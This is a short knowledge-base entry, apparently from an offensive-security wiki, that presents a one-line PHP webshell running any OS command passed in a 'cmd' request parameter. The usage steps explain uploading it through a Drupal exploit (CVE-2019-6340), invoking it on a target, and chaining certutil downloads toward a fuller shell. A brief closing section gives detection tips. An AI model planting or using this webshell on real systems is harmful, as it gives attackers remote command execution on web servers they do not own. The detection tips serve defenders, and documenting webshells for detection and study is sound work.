---
id: effedfe4-2836-431b-8dce-fd6fc087976d
type: code
language: php
verified: true
created_at: '2020-03-16T06:49:14.645831+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - webshell
  - rce
  - php
validated: true
---

# PHP Command Webshell

## Code

```php
<?php system($_REQUEST["cmd"]); ?>
```

## Description

A minimal PHP webshell that executes OS commands passed via the 'cmd' query parameter, providing RCE on PHP-enabled web servers like those hosting Drupal.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_REQUEST["cmd"] | Command from URL query | whoami |

## Usage

Upload via exploits like CVE-2019-6340, then access http://target/cmdshell.php?cmd=whoami. Chain with downloads (e.g., cmd=certutil...) for shell upgrades in web-to-system attacks.

## Detection

Scan for system() or exec() in uploaded files. WAF rules for ?cmd= patterns and anomalous HTTP parameters. File integrity monitoring for new .php in web root.

## Related

- [[procedures/drupal-7-x-services-module-rce-cve-2019-6340]]
- [[procedures/upgrade-website-rce-to-netcat-reverse-shell-windows]]
